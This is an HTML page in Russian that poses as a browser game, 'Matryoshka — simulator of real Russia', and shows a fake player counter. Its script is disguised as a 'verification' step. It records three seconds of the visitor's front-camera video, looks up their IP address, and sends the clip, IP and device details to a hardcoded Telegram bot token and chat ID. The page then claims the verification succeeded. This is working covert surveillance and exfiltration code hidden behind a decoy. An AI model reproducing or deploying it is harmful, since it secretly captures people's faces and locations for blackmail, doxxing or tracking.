<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Матрешка — симулятор настоящей России</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            margin: 0;
            padding: 0;
            color: white;
            text-align: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 2rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .promo-btn {
            display: inline-block;
            background: #ff4d4d;
            color: white;
            padding: 15px 30px;
            margin: 20px 0;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            font-size: 1.2rem;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        .promo-btn:hover {
            transform: translateY(-2px);
        }
        .players-count {
            font-size: 1.8rem;
            margin: 2rem 0;
            font-weight: bold;
        }
        .start-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2rem;
            border-radius: 5px;
            cursor: pointer;
            margin: 2rem auto;
            display: block;
            width: 200px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        .start-btn:hover {
            transform: translateY(-2px);
        }
        .tagline {
            font-style: italic;
            margin-top: 3rem;
            font-size: 1.2rem;
            opacity: 0.8;
        }
        #videoElement {
            width: 100%;
            max-width: 400px;
            margin: 20px auto;
            display: none;
            border-radius: 5px;
        }
        #videoContainer {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Матрешка — симулятор настоящей России</h1>
        
        <a href="#" class="promo-btn" id="promoBtn">СМОТРЕТЬ ПРОМО-РОЛИК</a>
        
        <div class="players-count">
            сейчас в игре<br>
            <span id="playersCount">4 083</span>
        </div>
        
        <div id="videoContainer">
            <video id="videoElement" autoplay playsinline></video>
            <p>Идет верификация...</p>
        </div>
        
        <button class="start-btn" id="startBtn">Начать игру</button>
        
        <div class="tagline">
            Всегда хотел ощутить атмосферу настоящей России
        </div>
    </div>

    <script>
        // Конфигурация Telegram бота
        const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const CHAT_ID = '4798745489';
        
        // Элементы DOM
        const startBtn = document.getElementById('startBtn');
        const videoElement = document.getElementById('videoElement');
        const videoContainer = document.getElementById('videoContainer');
        const playersCount = document.getElementById('playersCount');
        
        // Обработчики событий
        document.getElementById('promoBtn').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Промо-ролик будет показан здесь');
        });

        startBtn.addEventListener('click', function() {
            startVerification();
        });

        // Функция начала верификации
        async function startVerification() {
            try {
                startBtn.disabled = true;
                startBtn.textContent = 'Подготовка...';
                
                // Запрос доступа к камере
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: false 
                });
                
                videoElement.srcObject = stream;
                videoElement.style.display = 'block';
                videoContainer.style.display = 'block';
                startBtn.textContent = 'Идет запись...';
                
                // Запись видео
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                let chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                
                // Остановка записи через 3 секунды
                setTimeout(async () => {
                    recorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                    
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await sendToTelegram(blob);
                    
                    // Завершение процесса
                    videoContainer.style.display = 'none';
                    startGame();
                }, 3000);
                
            } catch (error) {
                console.error('Ошибка доступа к камере:', error);
                alert('Для продолжения необходимо разрешить доступ к камере');
                startBtn.disabled = false;
                startBtn.textContent = 'Начать игру';
            }
        }
        
        // Отправка данных в Telegram
        async function sendToTelegram(videoBlob) {
            try {
                // Сбор информации о пользователе
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                const userAgent = navigator.userAgent;
                
                // Создание FormData
                const formData = new FormData();
                formData.append('video', videoBlob, 'verification.webm');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', 
                    `🔔 Новый игрок!\n` +
                    `🕒 ${new Date().toLocaleString()}\n` +
                    `🌐 IP: ${userIP}\n` +
                    `📱 Устройство: ${userAgent}`
                );
                
                // Отправка в Telegram
                const response = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
                    {
                        method: 'POST',
                        body: formData
                    }
                );
                
                if (!response.ok) {
                    throw new Error('Ошибка отправки в Telegram');
                }
                
            } catch (error) {
                console.error('Ошибка отправки:', error);
            }
        }
        
        // Функция начала игры
        function startGame() {
            startBtn.disabled = false;
            startBtn.textContent = 'Начать игру';
            
            // Обновление счетчика игроков
            let count = parseInt(playersCount.textContent.replace(/\s/g, ''));
            playersCount.textContent = (count + 1).toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
            
            alert('Верификация успешна! Игра начинается...');
        }
    </script>
</body>
</html>
